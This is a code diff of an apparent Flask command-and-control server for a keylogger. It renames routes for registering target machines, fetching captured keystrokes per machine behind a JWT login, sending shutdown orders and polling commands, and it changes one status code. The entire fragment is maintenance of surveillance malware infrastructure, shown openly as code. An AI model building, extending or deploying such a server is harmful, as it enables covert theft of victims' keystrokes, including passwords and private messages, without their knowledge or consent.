@@ -51,7 +51,7 @@ def upload():
     return jsonify({"status": "success"}), 200
 
 
-@app.route('/api/create_machine', methods=['POST'])
+@app.route('/api/machine', methods=['POST'])
 def create_machine():
     data_path = 'data.json'
 
@@ -79,7 +79,7 @@ def create_machine():
     with open(data_path, 'w', encoding='utf-8') as file:
         json.dump(data_dict, file, ensure_ascii=False, indent=4)
 
-    return jsonify({"serial_number": serial_number,"key":key}), 200
+    return jsonify({"serial_number": serial_number,"key":key}), 201
 
 
 @app.route('/check_server', methods=['GET'])
@@ -93,10 +93,9 @@ def get_demo():
     return jsonify(data), 200
 
 
-@app.route('/api/get_keystrokes', methods=['GET'])
+@app.route('/api/keystrokes/<machine_sn>', methods=['GET'])
 @jwt_required()
-def get_keystrokes():
-    machine_sn = request.args.get('machine_sn')
+def get_keystrokes(machine_sn):
     start_date = request.args.get('start_date')
     end_date = request.args.get('end_date')
 
@@ -138,7 +137,7 @@ def get_keystrokes():
         return jsonify({"error":str(e)}), 200
 
 
-@app.route('/api/get_target_machines_list', methods=['GET'])
+@app.route('/api/machines', methods=['GET'])
 @jwt_required()
 def get_target_machines_list():
     try:
@@ -172,7 +171,7 @@ def login():
     return jsonify({"msg": "Invalid credentials"}), 401
 
 
-@app.route('/api/shutdown_client', methods=['POST'])
+@app.route('/api/shutdown', methods=['POST'])
 def shutdown_client():
 
     machine_sn = request.args.get('machine_sn')
@@ -197,7 +196,7 @@ def shutdown_client():
         return jsonify({"error": str(e)}), 500
 
 
-@app.route('/api/check_commands/<machine_sn>', methods=['GET'])
+@app.route('/api/commands/<machine_sn>', methods=['GET'])
 def check_commands(machine_sn):
     try:
         with open('data.json', 'r', encoding='utf-8') as f:
